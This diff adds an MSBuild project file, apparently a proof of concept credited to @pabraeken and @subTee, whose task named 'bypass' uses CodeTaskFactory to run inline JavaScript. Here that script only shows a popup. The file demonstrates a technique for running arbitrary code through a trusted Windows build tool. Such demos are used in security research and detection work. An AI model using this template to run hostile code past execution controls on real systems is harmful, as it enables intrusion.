@@ -1,0 +1,20 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+ <!-- Author: Pierre-Alexandre Braeken, Twitter: @pabraeken -->
+ <!-- Based on Casey Smith work (https://gist.github.com/subTee/ca477b4d19c885bec05ce238cbad6371), Twitter: @subTee  -->
+  <Target Name="bypass">
+   <bypass />
+  </Target>
+	<UsingTask
+    TaskName="bypass"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	<Task>
+	  <Reference Include="System.Management.Automation" />
+      <Code Language="JavaScript">
+        <![CDATA[		
+				var r = new ActiveXObject("WScript.Shell").popup("JavaScript executed");
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
